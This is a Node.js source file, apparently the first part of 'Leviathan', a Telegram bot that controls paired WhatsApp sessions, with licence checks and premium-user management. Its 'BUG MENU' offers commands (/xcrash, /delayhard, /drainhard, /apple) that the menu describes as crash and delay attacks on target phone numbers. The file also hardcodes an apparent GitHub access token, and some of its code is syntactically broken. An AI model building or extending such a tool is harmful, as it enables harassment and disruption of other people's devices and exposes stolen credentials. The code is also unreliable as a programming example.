/// ------ ( set const ) ------ \\\
const {
    default: makeWASocket,
    proto,
    DisconnectReason,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    generateWAMessage,
    prepareWAMessageMedia,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys")
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk"); 
const moment = require("moment");
const config = require("./config.js");
const { BOT_TOKEN, OWNER_ID } = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const ONLY_FILE = path.join(__dirname, "#Leviathan ♰", "gconly.json");
const cd = path.join(__dirname, "#Leviathan ♰", "cd.json");

/// --- ( Random Image ) --- \\\
const randomImages = [
  "https://files.catbox.moe/zwjhtw.png",
];

const getRandomImage = () => {
  return randomImages[Math.floor(Math.random() * randomImages.length)];
};

/// --- TEXXAS & GITHUB CONFIG --- \\
const GITHUB_USERNAME = "kaito515-japan";
const GITHUB_REPO = "7epply";
const GITHUB_BRANCH = "main";
const GITHUB_TOKEN = "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";

const PASSWORD_FILE = `https://raw.githubusercontent.com/${GITHUB_USERNAME}/${GITHUB_REPO}/${GITHUB_BRANCH}/database/passwords.json`;
const BLACKLIST_FILE = `https://raw.githubusercontent.com/${GITHUB_USERNAME}/${GITHUB_REPO}/${GITHUB_BRANCH}/database/blacklist.json`;
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/kaito515-japan/7epply/refs/heads/main/tokens.json";
// ----------------- ( Pengecekan Token ) ------------------- \\
async function updateGitHubFile(filename, newContent, message) {
  try {
    const url = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents/database/${filename}`;

    const getFile = await axios.get(url, {
      headers: { Authorization: `token ${GITHUB_TOKEN}` }
    });

    const sha = getFile.data.sha;

    await axios.put(url, {
      message,
      content: Buffer.from(JSON.stringify(newContent, null, 2)).toString("base64"),
      sha
    }, {
      headers: { Authorization: `token ${GITHUB_TOKEN}` }
    });

    console.log(chalk.green(`✅ ${filename} berhasil diperbarui`));
  } catch (err) {
    console.log(chalk.red(`❌ Gagal update ${filename}`));
  }
}

async function startSecuritySystem() {
  console.clear();
  console.log(chalk.bold.red("🔑 MASUKKAN PASSWORD:"));

  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  const inputPassword = await new Promise((resolve) => rl.question("> ", resolve));
  rl.close();

  try {
    const { data: passwordDB } = await axios.get(PASSWORD_FILE);
    const pass = passwordDB.find((x) => x.key === inputPassword);

    if (!pass) {
      console.log(chalk.red("❌ PASSWORD SALAH — TOKEN DI-BLACKLIST"));

      const { data: blacklist } = await axios.get(BLACKLIST_FILE);
      blacklist.push({
        token: BOT_TOKEN,
        reason: "Wrong password",
        time: new Date().toISOString()
      });

      await updateGitHubFile("blacklist.json", blacklist, "Auto blacklist - wrong password");
      process.exit(1);
    }

    if (pass.used) {
      console.log(chalk.yellow(`🛡 TEXXAS
PASSWORD SUDAH DIPAKAI!`));
      process.exit(1);
    }

    pass.used = true;
    await updateGitHubFile("passwords.json", passwordDB, `Password marked used`);

    console.log(chalk.green("✅ PASSWORD VALID — LANJUT CEK TOKEN..."));

  } catch (err) {
    console.log(chalk.red("❌ ERROR Password System:"), err.message);
    process.exit(1);
  }

  // BLACKLIST CHECK
  try {
    const { data: blacklist } = await axios.get(BLACKLIST_FILE);
    const isBlacklisted = blacklist.find((x) => x.token === BOT_TOKEN);

    if (isBlacklisted) {
      console.log(chalk.red(`🚫 TOKEN ANDA TERBLACKLIST`));
      process.exit(1);
    }
  } catch (err) {
    console.log(chalk.red("⚠️ Gagal cek blacklist:"), err.message);
  }
} // ← FIX: Kurung penutup benar

async function validateToken() {
  console.log(chalk.blue(`🔍 Memeriksa apakah token valid\n`));

  // Cek token environment
  if (!BOT_TOKEN) {
    console.error(chalk.red("❌ BOT_TOKEN tidak ditemukan! Pastikan sudah diset di .env"));
    process.exit(1);
  }

  // Ambil daftar token dari GitHub
  const validTokens = await fetchValidTokens(BOT_TOKEN);

  // Pastikan hasilnya berupa array
  if (!Array.isArray(validTokens)) {
    console.error(chalk.red("❌ Gagal memuat daftar token dari GitHub (data bukan array)"));
    process.exit(1);
  }

  // Validasi token
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red(`
═══════════════════════════════════════════
TOKEN ANDA TIDAK TERDAFTAR DI DATABASE !!!
═══════════════════════════════════════════
⠀⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
    process.exit(1);
  }

  console.log(chalk.green(`✅ あなたのトークンは有効です`));
  startBot();
  initializeWhatsAppConnections();
}

function startBot() {
  console.log(chalk.red(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ developer: k4ezue
☇ Name Script : leviathan
☇ Version : gen2
`));
console.log(chalk.white(``));

(async () => {
  // 1. CEK TOKEN DULU
  await validateToken();

  // 2. LANJUT ke TEXAS PASSWORD
  await startSecuritySystem();

  // 3. JALANKAN BOT
  startBot();
  initializeWhatsAppConnections();
})();



// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let sock;
function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

                  for (const botNumber of activeNumbers) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                  const sessionDir = createSessionDir(botNumber);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  sock = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botNumber} terhubung!`);
                  sessions.set(botNumber, sock);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  sock.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

//// --- ( Intalasi WhatsApp ) --- \\\
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
▢ Memproses Connecting
╰➤ Number: ${botNumber}
╰➤ Status: Connecting...
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
▢ Connection Gagal.
╰➤ Number: ${botNumber}
╰➤ Status: Gagal ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
▢ Connection Sukses
╰➤ Number: ${botNumber}
╰➤ Status: Sukses Connect.
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await sock.requestPairingCode(botNumber);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
▢ Code Pairing Kamu
╰➤ Number: ${botNumber}
╰➤ Code: ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>｢ Ϟ ｣ The ⸸ Leviathan</blockquote>
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
╰➤ Status: ${error.message} Error⚠️
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }


// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
            let premiumUsers = JSON.parse(fs.readFileSync('./#Leviathan ♰/premium.json'));
            let adminUsers = JSON.parse(fs.readFileSync('./#Leviathan ♰/admin.json'));

            function ensureFileExists(filePath, defaultData = []) {
            if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            }
            }
    
            ensureFileExists('./#Leviathan ♰/premium.json');
            ensureFileExists('./#Leviathan ♰/admin.json');


            function savePremiumUsers() {
            fs.writeFileSync('./#Leviathan ♰/premium.json', JSON.stringify(premiumUsers, null, 2));
            }

            function saveAdminUsers() {
            fs.writeFileSync('./#Leviathan ♰/admin.json', JSON.stringify(adminUsers, null, 2));
            }

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('./#Leviathan ♰/premium.json', (data) => (premiumUsers = data));
    watchFile('./#Leviathan ♰/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

/// --- ( Fungsi buat file otomatis ) --- \\\
if (!fs.existsSync(ONLY_FILE)) {
  fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: false }, null, 2));
}

// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}


function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

        let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}


/// --- ( Menu Utama ) --- \\\
const bugRequests = {};

// Command /start dengan auto delete dan menu utama
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
  
  // pesan awal
  const startMsg = await bot.sendMessage(chatId, `
HALO ${username}
BOT AKTIF ✅
VERSI BOT : 1.0 Beta
OWNER : @k4ezue
  `);

  // animasi bar loading
  const bars = ["▰▱▱▱▱", "▰▰▱▱▱", "▰▰▰▱▱", "▰▰▰▰▱", "▰▰▰▰▰"];
  for (let i = 0; i < bars.length; i++) {
    await new Promise(r => setTimeout(r, 400)); // delay
    await bot.editMessageText(
      `⚙️ Memuat data bot...\n${bars[i]} ${((i + 1) * 20)}%`,
      { chat_id: chatId, message_id: startMsg.message_id }
    );
  }

  // hapus pesan loading
  setTimeout(async () => {
    try { await bot.deleteMessage(chatId, startMsg.message_id); } catch {}
    const randomImage = "https://files.catbox.moe/zwjhtw.png";
    const date = new Date().toLocaleString("id-ID", { dateStyle: "full", timeStyle: "short" });

    await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>｢ The - Leviathan ｣</blockquote>
─ WhatsAppボットは、迅速で安全な自動化パートナー。あなたのデジタルライフを支援します。

<blockquote><b>「  Leviathan ☇ System ⸸  」</b></blockquote>
ᯤ Author : @k4ezue
ᯤ Prefix : / (slash)
ᯤ Version : 1.0 
ᯤ Status Core : ${sessions.size} Active ✅
ᯤ Libary : Node-Telegram-Api
ᯤ Type : ( Plugin )

<blockquote>( ! ) sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ</blockquote>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "｢⚙️｣ ☇ OPTIONS", callback_data: "ownermenu"}, 
            { text: "｢🛠｣ ☇ TOOLS", callback_data: "tools" },p
          ], 
          [
            { text:"｢🦠｣ ☇ BUG MENU", callback_data: "bugshow" }, 
          ],
          [
            { text: "｢👥｣ ☇ THANKS TO", callback_data: "thanksto" }, 
          ],
        ],
      },
    });
    
    setTimeout(() => {
        bot.sendAudio(chatId, fs.createReadStream("SINGGLE ERA/lagu.mp3"), {
            title: "LEVIATHAN ",
            performer: "t.me/k4ezue",
            caption: `<pre> LEVIATHAN 🚀 </pre>`,
            parse_mode: "HTML"
        });
    }, 100); 
  }); 
}); 

bot.on("callback_query", async (callbackQuery) => {
  try {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const randomImage = getRandomImage();
    const senderId = callbackQuery.from.id;
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
    const date = getCurrentDate(); // tambahkan date agar tidak undefined

    let newCaption = "";
    let newButtons = [];

    if (data === "bugshow") {
      newCaption = `
<blockquote>「 ⚔️𝐀𝐭𝐭𝐚𝐜𝐤˚𝐈𝐧𝐯𝐢𝐬𝐢𝐛𝐥𝐞-𝟏 」</blockquote>
┌──────────────────────┐
│ /delayhard 62xxxx
│  ╰➤ hard delay invisible
└──────────────────────┘

<blockquote>「 📟𝐀𝐭𝐭𝐚𝐜𝐤˚𝐂𝐫𝐚𝐬𝐡-𝟐 」</blockquote>
┌──────────────────────┐
│ /xcrash 62xxxx
│ ╰➤ Crash
└──────────────────────┘

<blockquote>「 🌎𝐀𝐭𝐭𝐚𝐜𝐤˚𝐁𝐮𝐥𝐝𝐨𝐳𝐞𝐫-𝟑 」</blockquote>
┌──────────────────────┐
│ /drainhard 62xxxx
│ ╰➤ Buldozer
└──────────────────────┘

<blockquote>「 🍏𝐀𝐭𝐭𝐚𝐜𝐤˚𝐀𝐩𝐩𝐥𝐞-𝟒 」</blockquote>
┌──────────────────────┐
│ /apple 62xxxx
│ ╰➤ IOS Crash
└──────────────────────┘
       
<blockquote>༑ᐧ 𖣂 𝐓𝐡𝐞 ☇ 𝐋𝐞𝐯𝐢𝐚𝐭𝐡𝐚𝐧 𖣂 ༑ᐧ</blockquote>
      `;
      newButtons = [
        [{ text: "ʙᴀᴄᴋ", callback_data: "mainmenu" }]
      ];
    } else if (data === "ownermenu") {
      newCaption = `
<blockquote>「 𝐂𝐨𝐧𝐭𝐫𝐨𝐥 - 𝐌𝐞𝐧𝐮 ⚘ 」</blockquote>
𔓘 /addprem 
↳ Tambahkan pengguna ke daftar premium
𔓘 /delprem 
 ↳ Hapus pengguna dari daftar premium
𔓘 /addadmin 
↳ Tambahkan admin baru
𔓘 /deladmin 
↳ Hapus admin dari sistem
𔓘 /listprem
 ↳ Lihat daftar seluruh user premium
𔓘 /setjeda 1m-5m
 ↳ Atur jeda waktu antar perintah
 𔓘 /getsession 
 ↳ Get session via adp
𔓘 /connect 
 ↳ Tambahkan nomor pengirim khusus
𔓘 /restartbot> 
 ↳ Restart bot
──[ Control Menu ]──
𔓘 /setmaintenance on/off 
 ↳ Aktifkan/nonaktifkan mode maintenance
𔓘 /maintenancestatus 
 ↳ Cek status mode maintenance
 
<blockquote>༑ᐧ 𖣂 𝐓𝐡𝐞 ☇ 𝐋𝐞𝐯𝐢𝐚𝐭𝐡𝐚𝐧 𖣂 ༑ᐧ</blockquote>
      `;
      newButtons = [
        [{ text: "ʙᴀᴄᴋ", callback_data: "mainmenu" }]
      ];
    } else if (data === "tools") {
      newCaption = `
<blockquote>「 𝐓𝐨𝐨𝐥𝐬 - 𝐌𝐞𝐧𝐮 ⚘ 」</blockquote>
ᝰ.ᐟ /iqc 
ᝰ.ᐟ /brat 
ᝰ.ᐟ /ig
ᝰ.ᐟ /cekid
ᝰ.ᐟ /whoami
ᝰ.ᐟ /antilink on/off
ᝰ.ᐟ /stat - cek pengguna aktif
ᝰ.ᐟ /maps - jakarta,dll
ᝰ.ᐟ /duel - username lawan
